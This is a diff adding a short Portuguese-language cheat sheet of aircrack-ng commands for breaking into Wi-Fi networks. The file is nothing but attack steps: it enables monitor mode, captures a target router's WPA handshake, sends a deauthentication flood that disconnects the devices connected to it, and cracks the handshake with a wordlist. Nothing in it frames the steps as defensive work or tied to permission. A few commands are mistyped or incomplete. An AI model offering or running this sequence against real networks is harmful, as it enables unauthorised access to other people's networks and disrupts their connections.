@@ -1,0 +1,22 @@
+Aircrackatack:
+	iwconfig
+	airmon-ng start wlan0
+	iwconfig
+	airodump-ng wlan0mon
+	airmon-ng stop wlan0
+	aircrack-ng check kill
+	airmon-ng check kill
+	airmon-ng start wlan0
+	airodump-ng wlan0mon
+Criando handshake:
+	iwconfig
+	ifconfig waln0 up
+	iwlist wlan0 scanning
+	airmon-ng start
+	ifconfig
+	airodump-ng mon0 --bssid "mac-roteador" --channel "canal" --write "nome do arquivo handshake.txt"
+
+Derrubando dispositivos conectados:
+	aireplay-ng -0 100 -a "mac-roteador" -c "mac dispositivo" mon0 --ignore-negative-one
+Atack:
+	aircrack-ng wifi-1.cap -w wordlist
